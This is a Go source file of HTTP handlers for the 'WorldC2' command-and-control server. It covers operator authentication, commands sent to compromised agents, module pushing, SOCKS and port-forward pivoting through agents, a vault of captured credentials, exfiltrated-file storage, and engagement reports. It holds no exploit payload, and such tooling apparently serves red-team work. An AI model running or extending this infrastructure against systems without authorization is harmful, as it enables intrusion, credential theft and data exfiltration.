package handlers

import (
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"mime"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/auth"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2/session"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/crypto"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/db"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/module"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/reporting"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/siem"
)

// handleLogin authenticates an operator and returns JWT tokens.
func (r *Router) handleLogin(w http.ResponseWriter, req *http.Request) {
	if req.Method != "POST" {
		http.Error(w, "method not allowed", 405)
		return
	}

	var loginReq struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(req.Body).Decode(&loginReq); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}

	operator, err := r.server.DB().AuthenticateOperator(loginReq.Username, loginReq.Password)
	if err != nil {
		r.server.DB().LogAction(0, "auth_failed", req.RemoteAddr)
		http.Error(w, `{"error":"invalid credentials"}`, 401)
		return
	}

	token, err := r.server.TokenManager().GenerateToken(operator.Username, operator.Role)
	if err != nil {
		http.Error(w, `{"error":"token generation failed"}`, 500)
		return
	}

	refreshToken, err := r.server.TokenManager().GenerateRefreshToken(operator.Username)
	if err != nil {
		http.Error(w, `{"error":"refresh token generation failed"}`, 500)
		return
	}

	r.server.DB().LogAction(0, "auth_success", operator.Username+" logged in")

	r.server.SIEM().Forward(siem.SIEMEvent{
		EventType: "operator_login",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"username": operator.Username,
			"role":     operator.Role,
			"remote":   req.RemoteAddr,
		},
	})

	json.NewEncoder(w).Encode(map[string]interface{}{
		"token":         token,
		"refresh_token": refreshToken,
		"expires_in":    43200,
		"user":          operator.Username,
		"role":          operator.Role,
	})
}

// handleRefresh issues a new access token from a refresh token.
func (r *Router) handleRefresh(w http.ResponseWriter, req *http.Request) {
	if req.Method != "POST" {
		http.Error(w, "method not allowed", 405)
		return
	}

	var refreshReq struct {
		RefreshToken string `json:"refresh_token"`
	}
	if err := json.NewDecoder(req.Body).Decode(&refreshReq); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}

	username, err := r.server.TokenManager().ValidateRefreshToken(refreshReq.RefreshToken)
	if err != nil {
		http.Error(w, `{"error":"invalid refresh token"}`, 401)
		return
	}

	operators, err := r.server.DB().ListOperators()
	if err != nil {
		http.Error(w, `{"error":"database error"}`, 500)
		return
	}

	// Reject refresh tokens for operators that no longer exist instead
	// of silently minting a token with an invented role.
	operatorRole := ""
	for _, op := range operators {
		if op["username"] == username {
			if r, ok := op["role"].(string); ok {
				operatorRole = r
			}
			break
		}
	}
	if operatorRole == "" {
		http.Error(w, `{"error":"operator not found"}`, 401)
		return
	}
	if !auth.IsValidRole(operatorRole) {
		// A legacy row with a missing/unknown role would authenticate and
		// then fail every RBAC check — fail the refresh with the real cause.
		http.Error(w, `{"error":"operator role is not a valid RBAC role"}`, 403)
		return
	}

	newToken, err := r.server.TokenManager().GenerateToken(username, operatorRole)
	if err != nil {
		http.Error(w, `{"error":"token generation failed"}`, 500)
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"token":      newToken,
		"expires_in": 43200,
	})
}

// handleHealth returns a minimal liveness payload. It is the only public
// endpoint besides login/refresh: no session counts, listener details or
// uptime leak to unauthenticated callers (liveness is all that load balancers
// and the Docker healthcheck need). The full telemetry lives in /api/status.
func (r *Router) handleHealth(w http.ResponseWriter, req *http.Request) {
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "ok",
	})
}

// handleStatus returns the operational telemetry that used to be exposed on
// the public /api/health: active session count, listeners and uptime. It is
// authenticated and gated by sessions:list so only real operators see it.
func (r *Router) handleStatus(w http.ResponseWriter, req *http.Request) {
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":          "ok",
		"active_sessions": r.server.ActiveSessions(),
		"listeners":       r.server.ListenerCount(),
		"uptime_seconds":  r.server.UptimeSeconds(),
	})
}

// handleListSessions returns all active sessions.
func (r *Router) handleListSessions(w http.ResponseWriter, req *http.Request) {
	sessions, _ := r.server.DB().ListActiveSessions()
	if sessions == nil {
		sessions = []db.SessionRecord{}
	}
	json.NewEncoder(w).Encode(sessions)
}

// handleSessionDetail returns session details and tasks.
func (r *Router) handleSessionDetail(w http.ResponseWriter, req *http.Request) {
	id := req.URL.Path[len("/api/sessions/"):]
	// Reject empty IDs and control characters (e.g. %00 path injection)
	// before they reach any lookup.
	if id == "" || strings.ContainsFunc(id, func(rr rune) bool { return rr < 0x20 || rr == 0x7f }) {
		http.Error(w, "invalid session id", 400)
		return
	}
	if req.Method == "DELETE" {
		// ?purge=true hard-deletes the session record (tasks and
		// persisted loot included); without it the agent is killed
		// and the row stays as historical record with state "killed".
		purge := req.URL.Query().Get("purge") == "true"
		if purge {
			if err := r.server.PurgeSession(id); err != nil {
				http.Error(w, err.Error(), 404)
				return
			}
			json.NewEncoder(w).Encode(map[string]string{"status": "purged"})
			return
		}
		if err := r.server.KillAgent(id); err != nil {
			http.Error(w, err.Error(), 404)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"status": "killed"})
		return
	}
	sess, err := r.server.DB().GetSession(id)
	if err != nil || sess == nil {
		http.Error(w, `{"error":"session not found"}`, 404)
		return
	}
	tasks, _ := r.server.DB().GetSessionTasks(id)
	json.NewEncoder(w).Encode(map[string]interface{}{"session": sess, "tasks": tasks})
}

// handleCommand executes a command on an agent.
func (r *Router) handleCommand(w http.ResponseWriter, req *http.Request) {
	validated, ok := ValidateCommandRequest(w, req)
	if !ok {
		return
	}
	result, err := r.server.CreateTaskWithContext(req.Context(), validated.AgentID, validated.Command, validated.Timeout)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	json.NewEncoder(w).Encode(result)
}

// handleBroadcast sends a command to all active agents.
func (r *Router) handleBroadcast(w http.ResponseWriter, req *http.Request) {
	command, ok := ValidateBroadcastRequest(w, req)
	if !ok {
		return
	}
	results := r.server.BroadcastTaskWithContext(req.Context(), command)
	json.NewEncoder(w).Encode(results)
}

// handleModules lists or registers modules.
func (r *Router) handleModules(w http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		modules := r.server.ModuleStore().List()
		json.NewEncoder(w).Encode(modules)
		return
	}
	if req.Method == "POST" {
		var m module.Manifest
		if err := json.NewDecoder(req.Body).Decode(&m); err != nil {
			http.Error(w, "invalid JSON: "+err.Error(), 400)
			return
		}
		if err := r.server.ModuleStore().Register(&m); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"status": "registered", "name": m.Name})
	}
}

// handleModulePush pushes a module to an agent.
func (r *Router) handleModulePush(w http.ResponseWriter, req *http.Request) {
	var pushReq struct {
		ModuleName string `json:"module"`
		AgentID    string `json:"agent_id"`
	}
	if err := json.NewDecoder(req.Body).Decode(&pushReq); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}

	packed, err := r.server.ModuleStore().Pack(pushReq.ModuleName)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}

	target := pushReq.AgentID
	if target == "" {
		r.server.Sessions().Range(func(k, v interface{}) bool {
			sess := v.(*session.Session)
			if sess.IsActive() {
				target = sess.ID
				return false
			}
			return true
		})
	}
	if target == "" {
		json.NewEncoder(w).Encode(map[string]string{"error": "no active agents"})
		return
	}

	data, _ := json.Marshal(packed)
	cmd := fmt.Sprintf("module_load:%s", base64.StdEncoding.EncodeToString(data))

	result, err := r.server.CreateTask(target, cmd, 30)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error(), "status": "failed"})
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "pushed",
		"module":  pushReq.ModuleName,
		"agent":   target,
		"success": result.Success,
		"output":  result.Output,
	})
}

// handleModuleDelete deletes a module.
func (r *Router) handleModuleDelete(w http.ResponseWriter, req *http.Request) {
	if req.Method != "DELETE" {
		http.Error(w, "method not allowed", 405)
		return
	}
	name := req.URL.Path[len("/api/modules/"):]
	if err := r.server.ModuleStore().Delete(name); err != nil {
		http.Error(w, err.Error(), 404)
		return
	}
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted", "name": name})
}

// handleSOCKS manages SOCKS5 proxies.
func (r *Router) handleSOCKS(w http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		json.NewEncoder(w).Encode(r.server.SOCKS5().ListProxies())
		return
	}
	var sockReq struct {
		SessionID string `json:"session_id"`
		Port      int    `json:"port"`
	}
	if err := json.NewDecoder(req.Body).Decode(&sockReq); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}
	if req.Method == "DELETE" {
		r.server.SOCKS5().StopProxy(sockReq.SessionID)
		json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
		return
	}

	if sockReq.SessionID == "" {
		r.server.Sessions().Range(func(k, v interface{}) bool {
			s := v.(*session.Session)
			if s.IsActive() {
				sockReq.SessionID = s.ID
				return false
			}
			return true
		})
	}

	dialFn := func(target string) (net.Conn, error) {
		var sess *session.Session
		r.server.Sessions().Range(func(k, v interface{}) bool {
			s := v.(*session.Session)
			if s.IsActive() && (s.AgentID == sockReq.SessionID || s.ID == sockReq.SessionID || s.Hostname == sockReq.SessionID) {
				sess = s
				return false
			}
			return true
		})
		if sess == nil {
			return nil, fmt.Errorf("session not found")
		}
		return r.server.Tunnels().OpenTunnel(sess, target)
	}

	addr, err := r.server.SOCKS5().StartProxy(sockReq.SessionID, sockReq.Port, dialFn)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	json.NewEncoder(w).Encode(map[string]string{"address": addr, "status": "started"})
}

// handleVault manages the credential vault.
func (r *Router) handleVault(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		var c c2.Credential
		if err := json.NewDecoder(req.Body).Decode(&c); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		id := r.server.Vault().Add(c)
		json.NewEncoder(w).Encode(map[string]string{"id": id, "status": "stored"})
		return
	}
	query := req.URL.Query().Get("q")
	if query != "" {
		json.NewEncoder(w).Encode(r.server.Vault().Search(query))
	} else {
		json.NewEncoder(w).Encode(r.server.Vault().List())
	}
}

// handleFiles manages exfiltrated files.
func (r *Router) handleFiles(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		var fileReq struct {
			SessionID string `json:"session_id"`
			Filename  string `json:"filename"`
			Module    string `json:"module"`
			Data      string `json:"data"`
		}
		if err := json.NewDecoder(req.Body).Decode(&fileReq); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		rec, err := r.server.Files().Store(fileReq.SessionID, fileReq.Filename, fileReq.Module, []byte(fileReq.Data))
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(rec)
		return
	}
	json.NewEncoder(w).Encode(r.server.Files().List())
}

// handleFileDownload downloads an exfiltrated file.
func (r *Router) handleFileDownload(w http.ResponseWriter, req *http.Request) {
	id := req.URL.Path[len("/api/files/download/"):]
	data, rec, err := r.server.Files().Read(id)
	if err != nil {
		http.Error(w, err.Error(), 404)
		return
	}
	w.Header().Set("Content-Disposition", mime.FormatMediaType("attachment", map[string]string{"filename": rec.Filename}))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(data)
}

// handleFileDelete purges a single exfiltrated file (blob on disk, current
// listing and persisted record). Ids are server-generated "file-<hex>"
// strings; anything else is rejected before it reaches the manager.
func (r *Router) handleFileDelete(w http.ResponseWriter, req *http.Request) {
	if req.Method != "DELETE" {
		http.Error(w, "method not allowed", 405)
		return
	}
	id := req.URL.Path[len("/api/files/"):]
	if id == "" || strings.ContainsAny(id, "/\\") ||
		strings.ContainsFunc(id, func(rr rune) bool { return rr < 0x20 || rr == 0x7f }) {
		http.Error(w, "invalid file id", 400)
		return
	}
	if err := r.server.Files().Delete(id); err != nil {
		http.Error(w, err.Error(), 404)
		return
	}
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
}

// handlePortFwd manages port forwarding.
func (r *Router) handlePortFwd(w http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		json.NewEncoder(w).Encode(r.server.PortFwds().List())
		return
	}
	if req.Method == "DELETE" {
		id := req.URL.Query().Get("id")
		if err := r.server.PortFwds().Stop(id); err != nil {
			http.Error(w, err.Error(), 404)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
		return
	}
	var fwdReq struct {
		SessionID  string `json:"session_id"`
		LocalPort  int    `json:"local_port"`
		RemoteHost string `json:"remote_host"`
		RemotePort int    `json:"remote_port"`
	}
	if err := json.NewDecoder(req.Body).Decode(&fwdReq); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}

	dialFn := func(target string) (net.Conn, error) {
		var sess *session.Session
		r.server.Sessions().Range(func(k, v interface{}) bool {
			s := v.(*session.Session)
			if s.AgentID == fwdReq.SessionID || s.ID == fwdReq.SessionID {
				sess = s
				return false
			}
			return true
		})
		if sess == nil {
			return nil, fmt.Errorf("session not found")
		}
		return r.server.Tunnels().OpenTunnel(sess, target)
	}

	fwd, err := r.server.PortFwds().Start(fwdReq.SessionID, fwdReq.LocalPort, fwdReq.RemoteHost, fwdReq.RemotePort, dialFn)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	json.NewEncoder(w).Encode(fwd)
}

// handleOperators manages operator accounts.
func (r *Router) handleOperators(w http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		operators, err := r.server.DB().ListOperators()
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(operators)
		return
	}
	if req.Method == "POST" {
		var opReq struct {
			Username string `json:"username"`
			Password string `json:"password"`
			Role     string `json:"role"`
		}
		if err := json.NewDecoder(req.Body).Decode(&opReq); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		if opReq.Username == "" || opReq.Password == "" {
			http.Error(w, "username and password required", 400)
			return
		}
		if opReq.Role == "" {
			opReq.Role = "operator"
		}
		if !auth.IsValidRole(opReq.Role) {
			// Without this check a typo like "Admin" would create an
			// operator that logs in but fails every permission check.
			http.Error(w, `{"error":"role must be one of: admin, operator, viewer, auditor"}`, 400)
			return
		}
		if err := r.server.DB().CreateOperator(opReq.Username, opReq.Password, opReq.Role); err != nil {
			http.Error(w, err.Error(), 409)
			return
		}
		r.server.DB().LogAction(0, "operator_create", opReq.Username)
		json.NewEncoder(w).Encode(map[string]string{"status": "created", "username": opReq.Username})
	}
}

// handleOperatorDelete deletes an operator.
func (r *Router) handleOperatorDelete(w http.ResponseWriter, req *http.Request) {
	if req.Method != "DELETE" {
		http.Error(w, "method not allowed", 405)
		return
	}
	id := req.URL.Path[len("/api/operators/"):]
	if err := r.server.DB().DeleteOperator(id); err != nil {
		http.Error(w, err.Error(), 404)
		return
	}
	// Invalidate outstanding JWTs for this operator: the signing key is
	// persisted in the secrets store, so without an explicit revocation
	// the deleted operator would keep API access until token expiry.
	r.server.TokenManager().RevokeUser(id)
	r.server.DB().LogAction(0, "operator_delete", id)
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
}

// handleNotes manages session notes.
func (r *Router) handleNotes(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		var noteReq struct {
			SessionID string `json:"session_id"`
			Content   string `json:"content"`
		}
		if err := json.NewDecoder(req.Body).Decode(&noteReq); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		if noteReq.SessionID == "" || noteReq.Content == "" {
			http.Error(w, "session_id and content required", 400)
			return
		}
		r.server.DB().AddSessionNote(noteReq.SessionID, 0, noteReq.Content)
		json.NewEncoder(w).Encode(map[string]string{"status": "added"})
		return
	}
	sessionID := req.URL.Query().Get("session_id")
	if sessionID == "" {
		http.Error(w, "session_id required", 400)
		return
	}
	notes, err := r.server.DB().GetSessionNotes(sessionID)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	json.NewEncoder(w).Encode(notes)
}

// handleLock manages session locks.
func (r *Router) handleLock(w http.ResponseWriter, req *http.Request) {
	var lockReq struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
	}
	if err := json.NewDecoder(req.Body).Decode(&lockReq); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}
	if lockReq.SessionID == "" {
		http.Error(w, "session_id required", 400)
		return
	}
	if lockReq.Action == "lock" {
		r.server.DB().LockSession(lockReq.SessionID, 0)
		json.NewEncoder(w).Encode(map[string]string{"status": "locked"})
	} else {
		r.server.DB().UnlockSession(lockReq.SessionID)
		json.NewEncoder(w).Encode(map[string]string{"status": "unlocked"})
	}
}

// handleProfiles manages agent configuration profiles.
func (r *Router) handleProfiles(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		var profReq struct {
			Name           string  `json:"name"`
			BeaconInterval int     `json:"beacon_interval"`
			Jitter         float64 `json:"jitter"`
			Transport      string  `json:"transport"`
		}
		if err := json.NewDecoder(req.Body).Decode(&profReq); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		id := fmt.Sprintf("profile-%x", time.Now().UnixNano())
		if profReq.BeaconInterval == 0 {
			profReq.BeaconInterval = 5
		}
		if profReq.Jitter == 0 {
			profReq.Jitter = 0.3
		}
		if profReq.Transport == "" {
			profReq.Transport = "tls"
		}
		r.server.DB().CreateAgentProfile(id, profReq.Name, profReq.BeaconInterval, profReq.Jitter, profReq.Transport)
		json.NewEncoder(w).Encode(map[string]string{"id": id, "status": "created"})
		return
	}
	profiles, err := r.server.DB().ListAgentProfiles()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	json.NewEncoder(w).Encode(profiles)
}

// handleReport generates engagement reports.
func (r *Router) handleReport(w http.ResponseWriter, req *http.Request) {
	format := req.URL.Query().Get("format")
	if format == "" {
		format = "text"
	}

	sessions, err := r.server.DB().ListAllSessions()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	creds, err := r.server.DB().ListCredentials()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	// Attribute the report to the authenticated operator instead of a
	// hardcoded "admin".
	operator := req.Header.Get("X-Auth-User")
	if operator == "" {
		operator = "unknown"
	}

	report := &reporting.EngagementReport{
		Title:     "WORLDC2 C2 Engagement Report",
		Operator:  operator,
		StartDate: time.Now().Add(-24 * time.Hour),
		EndDate:   time.Now(),
		Summary: reporting.ReportSummary{
			TotalSessions:    len(sessions),
			TotalCredentials: len(creds),
			UniqueOS:         make(map[string]int),
		},
	}

	for _, s := range sessions {
		report.Sessions = append(report.Sessions, reporting.SessionReport{
			ID: s.ID, AgentID: s.AgentID, Hostname: s.Hostname,
			OS: s.OS, Arch: s.Arch, Username: s.Username,
			IsAdmin: s.IsAdmin, PublicIP: s.PublicIP,
			FirstSeen: s.FirstSeen, LastSeen: s.LastSeen,
			State: s.State, TaskCount: s.TaskCount,
		})
		if s.State == "active" {
			report.Summary.ActiveSessions++
		}
		report.Summary.UniqueOS[s.OS]++
	}

	for _, c := range creds {
		report.Credentials = append(report.Credentials, reporting.CredentialReport{
			Username: c.Username, Password: c.Password, Domain: c.Domain,
			Host: c.Host, Service: c.Service, Source: c.Source, Captured: c.Captured,
		})
	}

	report.Summary.UniqueHosts = len(report.Summary.UniqueOS)

	var path string
	if format == "csv" {
		path, err = r.server.Reporter().GenerateCSV(report)
	} else {
		path, err = r.server.Reporter().GenerateText(report)
	}

	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"path": path, "status": "generated"})
}

// handleWebhooks manages SIEM webhook destinations. Destinations are
// persisted in the webhooks table (migration 9) and re-hydrated into the
// SIEM forwarder on server start, so they survive restarts.
func (r *Router) handleWebhooks(w http.ResponseWriter, req *http.Request) {
	switch req.Method {
	case http.MethodPost:
		var whReq struct {
			URL     string            `json:"url"`
			Headers map[string]string `json:"headers"`
			Timeout int               `json:"timeout_ms"`
			Events  []string          `json:"events"`
		}
		if err := json.NewDecoder(req.Body).Decode(&whReq); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		u, err := url.Parse(whReq.URL)
		if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Host == "" {
			// Only absolute http(s) URLs: prevents file:// and
			// custom-scheme SSRF abuse from the webhook forwarder.
			http.Error(w, "url must be an absolute http(s) URL", 400)
			return
		}
		id := newWebhookID()
		cfg := siem.WebhookConfig{
			ID:      id,
			URL:     whReq.URL,
			Headers: whReq.Headers,
			Timeout: time.Duration(whReq.Timeout) * time.Millisecond,
			Events:  whReq.Events,
		}
		// Persist first: if the DB write fails the destination must NOT
		// become live in-memory only (it would silently diverge from the
		// hydrated set on the next restart).
		if err := r.server.DB().SaveWebhook(&db.WebhookRecord{
			ID:        id,
			URL:       cfg.URL,
			Headers:   cfg.Headers,
			TimeoutMS: whReq.Timeout,
			Events:    cfg.Events,
		}); err != nil {
			log.Printf("[API] persist webhook: %v", err)
			http.Error(w, "failed to persist webhook", 500)
			return
		}
		r.server.SIEM().AddWebhook(cfg)
		w.WriteHeader(http.StatusCreated)
		json.NewEncoder(w).Encode(map[string]string{"status": "added", "id": id})

	case http.MethodDelete:
		id := req.URL.Query().Get("id")
		if id == "" {
			http.Error(w, "missing webhook id (?id=...)", 400)
			return
		}
		removed := r.server.SIEM().RemoveWebhook(id)
		deleted, err := r.server.DB().DeleteWebhook(id)
		if err != nil {
			log.Printf("[API] delete webhook %s: %v", id, err)
			http.Error(w, "failed to delete webhook", 500)
			return
		}
		if !removed && !deleted {
			http.Error(w, "webhook not found", 404)
			return
		}
		json.NewEncoder(w).Encode(map[string]bool{"deleted": true})

	default:
		// GET: return the actual webhook list — the OpenAPI spec documents
		// this endpoint as "List of webhooks".
		webhooks := r.server.SIEM().ListWebhooks()
		if webhooks == nil {
			webhooks = []siem.WebhookConfig{}
		}
		json.NewEncoder(w).Encode(webhooks)
	}
}

// newWebhookID mints a random identifier for a webhook destination
// (crypto/rand, not predictable counters — the ID is referenced by DELETE).
func newWebhookID() string {
	b := make([]byte, 12)
	if _, err := rand.Read(b); err != nil {
		// crypto/rand failure is catastrophic but must not panic the API;
		// fall back to a time-derived ID rather than an empty one.
		return fmt.Sprintf("wh-%x", time.Now().UnixNano())
	}
	return fmt.Sprintf("wh-%s", hex.EncodeToString(b))
}

// handleMTLSCert generates mTLS client certificates for agents.
func (r *Router) handleMTLSCert(w http.ResponseWriter, req *http.Request) {
	if req.Method != "POST" {
		http.Error(w, "method not allowed", 405)
		return
	}

	if !r.server.MTLSEnabled() {
		http.Error(w, `{"error":"mTLS not enabled"}`, 500)
		return
	}

	var certReq struct {
		AgentID string `json:"agent_id"`
	}
	if err := json.NewDecoder(req.Body).Decode(&certReq); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}
	if certReq.AgentID == "" {
		certReq.AgentID = fmt.Sprintf("agent-%x", time.Now().UnixNano())
	}

	agentCert, err := crypto.GenerateAgentCert(r.server.CACert(), r.server.CAKey(), certReq.AgentID)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), 500)
		return
	}

	caPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: r.server.CACert().Raw})
	agentCertPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: agentCert.Certificate[0]})
	var agentKeyPEM []byte
	if ecKey, ok := agentCert.PrivateKey.(*ecdsa.PrivateKey); ok {
		keyBytes, _ := x509.MarshalECPrivateKey(ecKey)
		agentKeyPEM = pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes})
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"agent_id":    certReq.AgentID,
		"cert_pem":    string(agentCertPEM),
		"key_pem":     string(agentKeyPEM),
		"ca_pem":      string(caPEM),
		"mtls_server": fmt.Sprintf("%s:%d", r.server.Config().Server.Host, r.server.Config().Server.Port),
	})
}
